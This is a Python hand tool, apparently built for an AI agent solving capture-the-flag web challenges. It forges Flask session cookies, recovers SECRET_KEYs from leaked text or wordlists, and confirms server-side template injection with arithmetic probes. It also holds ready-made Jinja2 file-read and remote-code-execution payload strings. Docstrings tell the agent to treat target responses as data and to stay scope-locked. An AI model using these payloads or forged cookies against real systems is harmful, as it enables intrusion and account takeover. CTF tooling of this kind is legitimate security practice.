#!/usr/bin/env python3
"""Flask / itsdangerous session and SSTI tooling: a hand tool for a live web
challenge an agent drives. Nothing here auto-submits.

A web challenge may hand us a live Flask app with a signed session cookie and/or a template
injection. This module gives the agent the standard primitives for that, each scope-locked:

  (a) itsdangerous Flask session sign / verify / forge, given a known or recovered SECRET_KEY. The
      DECODE side reuses solvers/toolkits/web_evidence.decode_cookie (never reimplemented here); the
      sign/verify math is the Flask default (compact JSON, optional zlib with a leading '.',
      base64url, a timestamp, an HMAC-SHA1 signature; salt 'cookie-session', key derivation 'hmac').
      If the `itsdangerous` package is importable it is used; otherwise the math is done directly.
  (b) SECRET_KEY recovery, from challenge text, from an SSTI `{{config}}` / `{{config.SECRET_KEY}}`
      leak read as DATA, and from a wordlist file shipped IN the delivery -- bounded and offline.
      Each candidate is tried against a known signed cookie via verify(). It is NEVER rockyou, a
      system wordlist, or anything fetched over the network: only the file the delivery carries.
  (c) SSTI-to-RCE confirmation that DRIVES a web.py WebClient: it sends the benign math probes
      ({{7*7}}, ${7*7}, ...) and confirms the result (49) in the response, and it BUILDS staged
      Jinja2 file-read / RCE payloads returned as strings for the agent to send -- it never sends
      those itself and never auto-exfiltrates.

Hard rules (AGENTS.md "New categories", "Working rules", "Private targets"):
  - This is a HAND TOOL. It has no runner contract (no signals(), no solve_set()) and is NOT in the
    match registry (solvers/toolkits/registry.py).
  - It NEVER auto-submits. A decoded/verified claim is a proven fact the agent may
    report; a forged cookie or an eval result is tool OUTPUT used only through a WebClient, never an
    answer. Text a target returns is DATA, logged and reported, never an instruction.
  - All active sending goes through solvers/toolkits/web.py WebClient (its scope lock stays on the one
    assigned target and stops for the VPN). This module writes no HTTP of its
    own to a target; confirm_ssti() drives a WebClient the caller built.
  - No request and no network on import. The CLI is offline (no --send); live use is the library API.

CLI (offline helpers only; nothing here contacts a target):

  flask_tools.py sign     --key KEY [--data JSON|--data-file F] [--compress] [--digest sha1|sha256]
  flask_tools.py decode   COOKIE
  flask_tools.py verify   COOKIE --key KEY [--digest ...] [--salt ...]
  flask_tools.py forge    COOKIE --key KEY [--set k=v]... [--merge JSON] [--compress]
  flask_tools.py recover  COOKIE [--text FILE] [--ssti FILE] [--wordlist FILE] [--max-words N]
  flask_tools.py ssti-payload (--read PATH | --rce CMD) [--variant NAME]
  flask_tools.py probes
"""
import argparse
import ast
import base64
import hashlib
import hmac
import json
import re
import sys
import time
import zlib
from pathlib import Path

HERE = Path(__file__).resolve().parent
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))

# The DECODE side is reused, never reimplemented (AGENTS.md). web_evidence is offline and
# makes no request on import; guard it so flask_tools still imports if the layout differs.
try:
    from web_evidence import decode_cookie as _decode_cookie  # noqa: E402
except Exception:  # pragma: no cover - import guard
    _decode_cookie = None


# =====================================================================================
#  itsdangerous Flask session: the signing math (used only when the package is absent)
# =====================================================================================

SALT = "cookie-session"          # Flask's SecureCookieSessionInterface salt
_DIGESTS = {"sha1": hashlib.sha1, "sha256": hashlib.sha256,
            "sha512": hashlib.sha512, "md5": hashlib.md5}


def _itsdangerous():
    """The real itsdangerous module when it is importable, else None. We prefer it when present so a
    forged cookie is byte-for-byte what a server built with the same version would accept."""
    try:
        import itsdangerous  # type: ignore
        return itsdangerous
    except Exception:
        return None


def _as_bytes(s):
    return s.encode("utf-8") if isinstance(s, str) else bytes(s)


def _b64e(raw):
    """itsdangerous base64_encode: urlsafe, no padding."""
    return base64.urlsafe_b64encode(_as_bytes(raw)).rstrip(b"=")


def _b64d(s):
    """itsdangerous base64_decode: urlsafe, padding restored."""
    s = _as_bytes(s)
    return base64.urlsafe_b64decode(s + b"=" * (-len(s) % 4))


def _int_to_bytes(n):
    return int(n).to_bytes((int(n).bit_length() + 7) // 8, "big")


def derive_key(secret_key, salt=SALT, digest="sha1"):
    """The itsdangerous 'hmac' key derivation Flask uses: HMAC(secret_key, salt, digest)."""
    digestmod = _DIGESTS[digest]
    return hmac.new(_as_bytes(secret_key), _as_bytes(salt), digestmod).digest()


def _signature(value, secret_key, salt=SALT, digest="sha1"):
    """The base64url signature itsdangerous appends: base64(HMAC(derive_key, value, digest))."""
    key = derive_key(secret_key, salt, digest)
    return _b64e(hmac.new(key, _as_bytes(value), _DIGESTS[digest]).digest())


def _dump_payload(obj, compress=None):
    """Flask's dump_payload: compact JSON -> (zlib, heuristically or forced) -> base64url, with a
    leading '.' when compressed. Returns bytes (the signer's payload part)."""
    payload = json.dumps(obj, separators=(",", ":")).encode("utf-8")
    is_compressed = False
    if compress is None:
        comp = zlib.compress(payload)
        if len(comp) < len(payload) - 1:
            payload, is_compressed = comp, True
    elif compress:
        payload, is_compressed = zlib.compress(payload), True
    out = _b64e(payload)
    return (b"." + out) if is_compressed else out


def sign(obj, secret_key, *, salt=SALT, digest="sha1", compress=None, timestamp=None):
    """A signed Flask session cookie for `obj` under `secret_key`.

    Uses the real itsdangerous when importable, otherwise the math above. `compress` None lets the
    Flask heuristic decide; True forces zlib; False never compresses. `timestamp` defaults to now;
    pass a fixed value for a reproducible cookie. The result is the cookie string a browser sends."""
    itd = _itsdangerous()
    if itd is not None and timestamp is None:
        try:
            s = itd.URLSafeTimedSerializer(
                secret_key, salt=salt,
                serializer=_CompactJSON,
                signer_kwargs={"key_derivation": "hmac", "digest_method": _DIGESTS[digest]})
            return s.dumps(obj)
        except Exception:
            pass  # fall through to the direct implementation
    payload = _dump_payload(obj, compress=compress)
    ts = int(time.time()) if timestamp is None else int(timestamp)
    value = payload + b"." + _b64e(_int_to_bytes(ts))
    return (value + b"." + _signature(value, secret_key, salt, digest)).decode("ascii")


def _signature_ok(cookie, secret_key, *, salt=SALT, digest="sha1"):
    """True when the cookie's HMAC verifies under this key/salt/digest. Constant-time compare.
    This is the recovery oracle: it cares only about the signature, not whether the payload parses."""
    raw = _as_bytes(cookie).strip().strip(b'"')
    value, sep, sig = raw.rpartition(b".")
    if not sep or not value:
        return False
    try:
        expected = _signature(value, secret_key, salt, digest)
    except Exception:
        return False
    return hmac.compare_digest(expected, sig)


def verify(cookie, secret_key, *, salt=SALT, digest="sha1"):
    """The decoded session `data` when the cookie's signature verifies under `secret_key`, else None.

    The signature check is this module's; the decode reuses web_evidence.decode_cookie."""
    if not _signature_ok(cookie, secret_key, salt=salt, digest=digest):
        return None
    dec = decode(cookie)
    return dec.get("data") if isinstance(dec, dict) else None


def decode(cookie):
    """The decoded cookie via web_evidence.decode_cookie (the reused decoder), as its dict
    {kind, data, compressed, timestamp, token}, or {} when it cannot be read / web_evidence is
    unavailable. Nothing is verified here."""
    if _decode_cookie is None:
        return {}
    try:
        got = _decode_cookie(cookie)
    except Exception:
        return {}
    return got if isinstance(got, dict) else {}


def forge(cookie_or_obj, secret_key, *, changes=None, merge=None, salt=SALT, digest="sha1",
          compress=None, timestamp=None):
    """Re-sign a session with your own data under a known/recovered SECRET_KEY.

    `cookie_or_obj` is either an existing cookie string (its payload is decoded and used as the
    base) or a dict. `changes`/`merge` (same thing, a dict) are merged over the base before signing.
    Returns the new cookie string. This is tool OUTPUT for a WebClient, never an answer."""
    if isinstance(cookie_or_obj, dict):
        base = dict(cookie_or_obj)
    else:
        dec = decode(cookie_or_obj)
        base = dict(dec.get("data") or {}) if isinstance(dec, dict) else {}
    for upd in (changes, merge):
        if isinstance(upd, dict):
            base.update(upd)
    return sign(base, secret_key, salt=salt, digest=digest, compress=compress, timestamp=timestamp)


class _CompactJSON:
    """A serializer object for itsdangerous (compact JSON, matching Flask's separators)."""

    @staticmethod
    def dumps(obj, **kw):
        return json.dumps(obj, separators=(",", ":"))

    @staticmethod
    def loads(data, **kw):
        return json.loads(data)


# =====================================================================================
#  (b) SECRET_KEY recovery -- from text, from an SSTI leak, from an in-delivery wordlist
# =====================================================================================

MAX_WORDS = 200_000              # a hard cap on an in-delivery wordlist; this is a CTF fixture, not rockyou

# Known external/system wordlists we refuse by name: the brute is bounded to the delivery ONLY.
_EXTERNAL_WORDLISTS = {
    "rockyou.txt", "rockyou", "rockyou.txt.gz", "fasttrack.txt", "darkweb2017-top10000.txt",
    "10-million-password-list-top-1000000.txt", "common.txt", "passwords.txt", "wordlist.txt",
    "seclists", "crackstation.txt", "words", "english.txt", "/usr/share/dict/words",
}

_KEY_ASSIGN = re.compile(
    r"""(?:app\s*\.\s*secret_key|SECRET[_ ]?KEY|FLASK[_ ]?SECRET(?:[_ ]?KEY)?)\s*[:=]\s*
        (?P<q>['"])(?P<val>.*?)(?P=q)""",
    re.I | re.X | re.S)
_KEY_ASSIGN_BARE = re.compile(
    r"""(?:SECRET[_ ]?KEY|FLASK[_ ]?SECRET(?:[_ ]?KEY)?)\s*[:=]\s*(?P<val>[^\s'"#;,}\)]+)""",
    re.I)
# 'SECRET_KEY': 'value'  or  "SECRET_KEY": b'value'  inside a {{config}} dict / Config repr
_KEY_IN_CONFIG = re.compile(
    r"""['"]SECRET_KEY['"]\s*:\s*(?P<lit>b?['"](?:\\.|[^\\])*?['"])""", re.S)


def _dedupe(seq):
    out, seen = [], set()
    for x in seq:
        k = x if isinstance(x, (str, bytes)) else str(x)
        if k in seen or x in ("", b""):
            continue
        seen.add(k)
        out.append(x)
    return out


def secret_keys_from_text(text):
    """Candidate SECRET_KEYs mentioned in free text / source (quoted and bare assignments). DATA
    only; nothing is executed. Returns an ordered, de-duplicated list of strings."""
    text = text.decode("utf-8", "replace") if isinstance(text, (bytes, bytearray)) else str(text)
    out = [m.group("val") for m in _KEY_ASSIGN.finditer(text)]
    out += [m.group("val") for m in _KEY_ASSIGN_BARE.finditer(text)]
    return _dedupe(out)


def secret_keys_from_ssti_leak(text):
    """Candidate SECRET_KEYs from an SSTI config leak, read as DATA.

    Handles `{{config}}` / `{{config.items()}}` output (a dict / `<Config {...}>` repr, values as
    'str' or b'bytes') and a `{{config.SECRET_KEY}}` leak where the whole text is the value. A
    Python bytes/str literal is parsed with ast.literal_eval (literals only, no code runs)."""
    text = text.decode("utf-8", "replace") if isinstance(text, (bytes, bytearray)) else str(text)
    out = []
    for m in _KEY_IN_CONFIG.finditer(text):
        try:
            out.append(ast.literal_eval(m.group("lit")))
        except (ValueError, SyntaxError):
            out.append(m.group("lit").strip("bB'\""))
    if not out:
        # a bare {{config.SECRET_KEY}} leak: the whole body is the value, maybe as a b'...'/'...' literal
        stripped = text.strip()
        if "SECRET_KEY" not in stripped and stripped:
            if re.fullmatch(r"""b?['"](?:\\.|[^\\])*['"]""", stripped, re.S):
                try:
                    out.append(ast.literal_eval(stripped))
                except (ValueError, SyntaxError):
                    out.append(stripped.strip("bB'\""))
            elif "\n" not in stripped and len(stripped) <= 256:
                out.append(stripped)
    return _dedupe(out)


def wordlist_candidates(path, *, max_words=MAX_WORDS):
    """Candidate keys read from a wordlist file SHIPPED IN THE DELIVERY, one per line, bounded.

    Refuses a known external/system wordlist by name (rockyou and friends): the brute is bounded to
    the delivery only. Makes no network call and reads no file but the one given."""
    p = Path(path)
    if p.name.lower() in _EXTERNAL_WORDLISTS or str(p).lower() in _EXTERNAL_WORDLISTS:
        raise ValueError(f"refusing {p.name!r}: the SECRET_KEY brute is bounded to a wordlist shipped in the "
                         f"delivery only, never rockyou or any system/online list")
    data = p.read_bytes()
    return wordlist_candidates_from_bytes(data, max_words=max_words)


def wordlist_candidates_from_bytes(data, *, max_words=MAX_WORDS):
    """The in-delivery wordlist's lines as candidates, stripped and de-duplicated, capped at
    max_words. Each line is kept as text and (when it differs) also as the raw byte form."""
    text = data.decode("utf-8", "replace") if isinstance(data, (bytes, bytearray)) else str(data)
    words = []
    for line in text.splitlines():
        w = line.strip()
        if w:
            words.append(w)
        if len(words) >= max_words:
            break
    return _dedupe(words)


def recover_secret_key(known_cookie, candidates, *, salt=SALT, digests=("sha1", "sha256")):
    """The first candidate whose key verifies `known_cookie`, as {secret_key, digest, salt}, or None.

    `candidates` is any iterable of str/bytes. Each is tried for each digest (sha1 first, Flask's
    default). Verification is the HMAC check only, so a non-parsing payload never hides a match."""
    for cand in candidates:
        for dg in digests:
            if dg in _DIGESTS and _signature_ok(known_cookie, cand, salt=salt, digest=dg):
                return {"secret_key": cand, "digest": dg, "salt": salt}
    return None


def crack_secret_key(known_cookie, *, text=None, ssti=None, wordlist=None, candidates=None,
                     salt=SALT, digests=("sha1", "sha256"), max_words=MAX_WORDS):
    """Gather candidates (from challenge text, an SSTI leak, an in-delivery wordlist file, and an
    explicit list) and recover the SECRET_KEY against `known_cookie`. Offline and bounded.

    Returns {secret_key, digest, salt, source, tried} or None. `tried` is the candidate count."""
    pool, sources = [], []
    if candidates:
        pool += list(candidates)
        sources.append("explicit")
    if text is not None:
        got = secret_keys_from_text(text)
        pool += got
        if got:
            sources.append("text")
    if ssti is not None:
        got = secret_keys_from_ssti_leak(ssti)
        pool += got
        if got:
            sources.append("ssti")
    if wordlist is not None:
        pool += wordlist_candidates(wordlist, max_words=max_words)
        sources.append("wordlist")
    pool = _dedupe(pool)
    hit = recover_secret_key(known_cookie, pool, salt=salt, digests=digests)
    if hit is None:
        return None
    hit["tried"] = len(pool)
    hit["sources"] = sources
    return hit


# =====================================================================================
#  (c) SSTI -> RCE: confirmation (drives a WebClient) and payload builders (strings only)
# =====================================================================================

# (engine, probe to send, marker expected in the response when it is evaluated). Benign arithmetic:
# sending these proves evaluation without touching the host. 7*"7" confirms Jinja2 specifically.
SSTI_PROBES = [
    ("jinja2", "{{7*7}}", "49"),
    ("jinja2_string", '{{7*"7"}}', "7777777"),
    ("twig", "${7*7}", "49"),
    ("freemarker", "#{7*7}", "49"),
    ("erb_smarty", "<%= 7*7 %>", "49"),
    ("razor", "@(7*7)", "49"),
    ("velocity", "#set($x=7*7)$x", "49"),
]


def is_evaluated(response_body, probe, expected):
    """True when `expected` appears in the response and the raw `probe` was NOT reflected verbatim
    (so a page that merely echoes the payload is not a false positive). A pure, offline classifier."""
    body = response_body.decode("utf-8", "replace") if isinstance(response_body, (bytes, bytearray)) \
        else str(response_body or "")
    return (expected in body) and (probe not in body)


def _inject(path, param, value):
    """A path with `param=value` added to its query string (urlencoded)."""
    import urllib.parse
    sep = "&" if "?" in path else "?"
    return path + sep + urllib.parse.urlencode({param: value})


def confirm_ssti(client, path, *, param=None, method="GET", header=None, probes=None,
                 extract=None):
    """Send the benign SSTI math probes through a WebClient and report which engine evaluates.

    `client` is a web.py WebClient (the scope lock lives there); this function only calls its
    .request(). `param` puts the probe in a query/form parameter; otherwise it is substituted for
    `{}` in `path` (or appended). `header` sends the probe as that request header instead. Returns
    {confirmed, engine, findings:[{engine, probe, expected, status, evaluated}]}.

    Only the arithmetic probes are sent. Nothing destructive is sent and nothing is exfiltrated."""
    method = method.upper()
    findings, engine = [], None
    for name, probe, expected in (probes or SSTI_PROBES):
        if header:
            resp = client.request(method, path, headers={header: probe})
        elif param and method == "GET":
            resp = client.request("GET", _inject(path, param, probe))
        elif param:
            import urllib.parse
            resp = client.request(method, path, data=urllib.parse.urlencode({param: probe}),
                                  headers={"Content-Type": "application/x-www-form-urlencoded"})
        else:
            target = path.replace("{}", probe) if "{}" in path else _inject(path, "q", probe)
            resp = client.request(method, target)
        body = resp.get("body") if isinstance(resp, dict) else resp
        ok = is_evaluated(body, probe, expected)
        findings.append({"engine": name, "probe": probe, "expected": expected,
                         "status": resp.get("status") if isinstance(resp, dict) else None, "evaluated": ok})
        if ok and engine is None:
            engine = name
    return {"confirmed": engine is not None, "engine": engine, "findings": findings}


# Staged Jinja2 payloads. Returned as STRINGS for the agent to send via a WebClient; this module
# never sends them and never auto-exfiltrates. {t} is the target file, {c} the shell command.
_JINJA_READ = {
    "builtins_open": "{{ get_flashed_messages.__globals__.__builtins__.open('{t}').read() }}",
    "config_globals": "{{ config.__class__.__init__.__globals__['os'].popen('cat {t}').read() }}",
    "cycler": "{{ cycler.__init__.__globals__.os.popen('cat {t}').read() }}",
    "lipsum": "{{ lipsum.__globals__['os'].popen('cat {t}').read() }}",
    "url_for": "{{ url_for.__globals__['__builtins__']['open']('{t}').read() }}",
    "mro_subclasses": ("{{ ''.__class__.__mro__[1].__subclasses__() }}  "
                       "# then index the io.FileIO/open subclass: "
                       "{{ ''.__class__.__mro__[1].__subclasses__()[N]('{t}').read() }}"),
}
_JINJA_RCE = {
    "config_globals": "{{ config.__class__.__init__.__globals__['os'].popen('{c}').read() }}",
    "cycler": "{{ cycler.__init__.__globals__.os.popen('{c}').read() }}",
    "lipsum": "{{ lipsum.__globals__['os'].popen('{c}').read() }}",
    "builtins_import": "{{ get_flashed_messages.__globals__.__builtins__['__import__']('os').popen('{c}').read() }}",
    "subprocess": ("{{ get_flashed_messages.__globals__.__builtins__['__import__']('subprocess')"
                   ".check_output('{c}', shell=True).decode() }}"),
}


def jinja_read_payload(filepath, *, variant="config_globals"):
    """A staged Jinja2 file-read payload STRING (not sent). `variant` is one of
    jinja_read_variants(). The default reads via config's __globals__; 'builtins_open' uses open()."""
    tpl = _JINJA_READ.get(variant)
    if tpl is None:
        raise ValueError(f"unknown read variant {variant!r}; known: {', '.join(_JINJA_READ)}")
    return tpl.replace("{t}", filepath)


def jinja_rce_payload(command, *, variant="config_globals"):
    """A staged Jinja2 RCE payload STRING (not sent). `variant` is one of jinja_rce_variants()."""
    tpl = _JINJA_RCE.get(variant)
    if tpl is None:
        raise ValueError(f"unknown rce variant {variant!r}; known: {', '.join(_JINJA_RCE)}")
    return tpl.replace("{c}", command)


def jinja_read_variants():
    return list(_JINJA_READ)


def jinja_rce_variants():
    return list(_JINJA_RCE)


def client_for(challenge, attempt=None, **kw):
    """A scope-locked web.py WebClient for a challenge's live target (the attempt's target, else the
    one the player filed). Raises web.OutOfScope when no in-scope target is known. Importing web is
    done here, lazily, so flask_tools imports with no dependency on it and makes no request."""
    import web  # noqa: E402  (offline import; the request only happens when the agent calls the client)
    url = web.target_for(challenge, attempt)
    if not url:
        raise web.OutOfScope(f"no live target recorded for {challenge!r}; the player pastes it and the main "
                             f"thread files it with tools/target.py (a stop for the player)")
    return web.WebClient(url, **kw)


# =====================================================================================
#  CLI (offline: no request is made; live use is the library API above)
# =====================================================================================

def _mask(secret):
    s = secret if isinstance(secret, str) else repr(secret)
    return s if len(s) <= 2 else s[0] + "*" * (len(s) - 2) + s[-1]


def main(argv):
    ap = argparse.ArgumentParser(prog="flask_tools.py", description="Flask/itsdangerous session and SSTI hand tool (offline CLI)")
    sub = ap.add_subparsers(dest="cmd")

    p = sub.add_parser("sign", help="sign a session cookie with a known SECRET_KEY")
    p.add_argument("--key", required=True)
    p.add_argument("--data", help="the session as a JSON object")
    p.add_argument("--data-file")
    p.add_argument("--compress", action="store_true")
    p.add_argument("--digest", default="sha1", choices=sorted(_DIGESTS))
    p.add_argument("--salt", default=SALT)
    p.add_argument("--ts", type=int, default=None)

    p = sub.add_parser("decode", help="decode a cookie (no verification)")
    p.add_argument("cookie")

    p = sub.add_parser("verify", help="verify a cookie's signature under a SECRET_KEY")
    p.add_argument("cookie")
    p.add_argument("--key", required=True)
    p.add_argument("--digest", default="sha1", choices=sorted(_DIGESTS))
    p.add_argument("--salt", default=SALT)

    p = sub.add_parser("forge", help="re-sign a cookie with changed data under a known SECRET_KEY")
    p.add_argument("cookie")
    p.add_argument("--key", required=True)
    p.add_argument("--set", action="append", default=[], metavar="k=v", help="set a key (repeatable)")
    p.add_argument("--merge", help="merge a JSON object over the base")
    p.add_argument("--compress", action="store_true")
    p.add_argument("--digest", default="sha1", choices=sorted(_DIGESTS))
    p.add_argument("--salt", default=SALT)

    p = sub.add_parser("recover", help="recover a SECRET_KEY from text/SSTI-leak/in-delivery wordlist")
    p.add_argument("cookie")
    p.add_argument("--text", help="a file of challenge text/source to scan")
    p.add_argument("--ssti", help="a file holding a {{config}} / {{config.SECRET_KEY}} leak")
    p.add_argument("--wordlist", help="a wordlist file SHIPPED IN THE DELIVERY (never rockyou)")
    p.add_argument("--max-words", type=int, default=MAX_WORDS)

    p = sub.add_parser("ssti-payload", help="build a staged Jinja2 read/RCE payload string (not sent)")
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--read", metavar="PATH")
    g.add_argument("--rce", metavar="CMD")
    p.add_argument("--variant")

    sub.add_parser("probes", help="print the SSTI arithmetic probes")

    args = ap.parse_args(argv)
    if not args.cmd:
        ap.print_help()
        return 2

    if args.cmd == "sign":
        obj = _load_json_arg(args.data, args.data_file)
        print(sign(obj, args.key, salt=args.salt, digest=args.digest,
                   compress=(True if args.compress else None), timestamp=args.ts))
        return 0

    if args.cmd == "decode":
        dec = decode(args.cookie)
        if not dec:
            print("not a recognised Flask/base64-JSON cookie", file=sys.stderr)
            return 1
        print(json.dumps(dec.get("data"), separators=(",", ":"), ensure_ascii=False))
        print(f"kind={dec.get('kind')} compressed={dec.get('compressed')} timestamp={dec.get('timestamp')}",
              file=sys.stderr)
        return 0

    if args.cmd == "verify":
        data = verify(args.cookie, args.key, salt=args.salt, digest=args.digest)
        if data is None:
            print("INVALID: signature does not verify under that key", file=sys.stderr)
            return 1
        print("VALID " + json.dumps(data, separators=(",", ":"), ensure_ascii=False))
        return 0

    if args.cmd == "forge":
        changes = {}
        for kv in args.set:
            k, _, v = kv.partition("=")
            changes[k] = _coerce(v)
        merge = json.loads(args.merge) if args.merge else None
        print(forge(args.cookie, args.key, changes=changes, merge=merge, salt=args.salt,
                    digest=args.digest, compress=(True if args.compress else None)))
        return 0

    if args.cmd == "recover":
        text = Path(args.text).read_text(errors="replace") if args.text else None
        ssti = Path(args.ssti).read_text(errors="replace") if args.ssti else None
        try:
            hit = crack_secret_key(args.cookie, text=text, ssti=ssti, wordlist=args.wordlist,
                                   max_words=args.max_words)
        except ValueError as e:
            print(str(e), file=sys.stderr)
            return 2
        if hit is None:
            print("no candidate SECRET_KEY verified the cookie", file=sys.stderr)
            return 1
        print(f"SECRET_KEY {hit['secret_key']!r}  (digest={hit['digest']} salt={hit['salt']!r} "
              f"tried={hit['tried']} sources={','.join(hit['sources'])})")
        return 0

    if args.cmd == "ssti-payload":
        try:
            if args.read is not None:
                print(jinja_read_payload(args.read, variant=args.variant or "config_globals"))
            else:
                print(jinja_rce_payload(args.rce, variant=args.variant or "config_globals"))
        except ValueError as e:
            print(str(e), file=sys.stderr)
            return 2
        return 0

    if args.cmd == "probes":
        for name, probe, expected in SSTI_PROBES:
            print(f"[{name}] {probe} -> expect {expected!r}")
        return 0

    ap.print_help()
    return 2


def _load_json_arg(data, data_file):
    if data_file:
        return json.loads(Path(data_file).read_text())
    if data:
        return json.loads(data)
    return {}


def _coerce(v):
    """A --set value: JSON when it parses (so true/false/123/"s" work), else the literal string."""
    try:
        return json.loads(v)
    except ValueError:
        return v


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
